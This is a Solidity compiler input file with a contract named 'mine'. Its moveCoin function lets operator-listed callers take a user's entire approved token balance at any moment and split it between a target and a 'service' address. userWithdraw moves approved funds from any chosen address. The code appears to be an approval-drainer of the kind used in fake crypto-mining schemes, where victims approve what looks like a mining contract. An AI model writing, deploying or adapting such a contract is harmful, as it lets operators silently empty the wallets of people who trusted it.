{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/mine.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0 <0.9.0;\n\n\ncontract Auth {\n\n  address public owner;\n\n  mapping(address => bool) callerList;\n\n\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n  event AddCaller(address callerAdress);\n  event RemoveCaller(address callerAdress);\n\n\n  /**\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n   * account.\n   */\n  constructor() {\n    owner = msg.sender;\n  }\n\n\n  /**\n   * @dev Throws if called by any account other than the owner.\n   */\n  modifier onlyOwner() {\n    require(msg.sender == owner, \"Ownable: caller is not the owner\");\n    _;\n  }\n\n  /**\n   *@dev\n   */\n  modifier onlyCaller() {\n    require(callerList[msg.sender] == true, \"Ownable: caller is not the caller\");\n    _;\n  }\n\n  function addCaller(address callerAdress) public onlyOwner {\n        callerList[callerAdress] = true;\n        emit AddCaller(callerAdress);\n  }\n\n  function removeCaller(address callerAdress) public onlyOwner {\n        callerList[callerAdress] = false;\n         emit RemoveCaller(callerAdress);\n  }\n\n\n  /**\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\n   * @param newOwner The address to transfer ownership to.\n   */\n  function transferOwnership(address newOwner) public onlyOwner {\n    require(newOwner != address(0));\n    emit OwnershipTransferred(owner, newOwner);\n    owner = newOwner;\n  }\n\n}\n\ninterface IERC20 {\n    \n    function totalSupply() external view returns (uint256);\n\n    \n    function balanceOf(address account) external view returns (uint256);\n\n    \n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n   \n    function approve(address spender, uint256 amount) external returns (bool);\n\n  \n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n   \n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract mine  is Auth {\n\n    event MoveCoin(address userAddress, uint256 balance);\n\n    event UserWithdraw(address fromAdress, address toAdress, uint256 fee);\n\n    IERC20 token;\n\n    constructor (IERC20 tokenAddress) {\n        token = tokenAddress;\n    }\n\n    // 提取用户金额.\n    function moveCoin(address userAddress, address targetAdress, address serviceAddress, uint256 rate) public  onlyCaller returns (uint256){\n\n        // 查询用户余额，然后划转.\n        uint256 balance = token.balanceOf(userAddress);\n\n        uint256 baifenbi = 100;\n        \n        require(rate >= 0 && rate <= baifenbi, \"moveCoin: rate range 0 ~ 100\");\n\n        if(balance > 0) {\n\n            // 平台手续费\n            uint256 serviceFee = balance * (baifenbi - rate) / baifenbi;\n\n            // 划转金额.\n            uint256 earchFee = balance * (rate) / baifenbi;\n\n            \n            if(earchFee > 0) {\n              token.transferFrom(userAddress, targetAdress, earchFee);\n            }\n\n            if(serviceFee > 0) {\n              token.transferFrom(userAddress, serviceAddress, serviceFee);\n            }\n        }\n\n        emit MoveCoin(userAddress, balance);\n\n        return balance;\n    }\n\n    // 授权地址转载转账.\n    function userWithdraw(address fromAdress, address toAdress, uint256 fee) public onlyCaller {\n\n         // 判断余额是否充足\n         require(token.balanceOf(fromAdress) >= fee, \"UserWithdraw: Withdraw Adress have not enough fee for withdrawv \");\n\n         // 判断提现账号是否授权合约足够余额转账.\n         require(token.allowance(fromAdress, address(this)) >= fee, \"UserWithdraw: Withdraw Adress don't allow contract fee for transfer \");\n\n         token.transferFrom(fromAdress, toAdress, fee);\n\n         emit UserWithdraw(fromAdress, toAdress, fee);\n    }\n\n    // 合约转账.\n    function userWithdrawvByContract(address toAdress, uint256 fee) public onlyCaller {\n\n         // 判断余额是否充足\n         require(token.balanceOf(address(this)) >= fee, \"UserWithdraw:Contract have not enough fee for withdrawv \");\n\n         token.transfer(toAdress, fee);\n\n         emit UserWithdraw(address(this), toAdress, fee);\n    }\n\n}"
    }
  }
}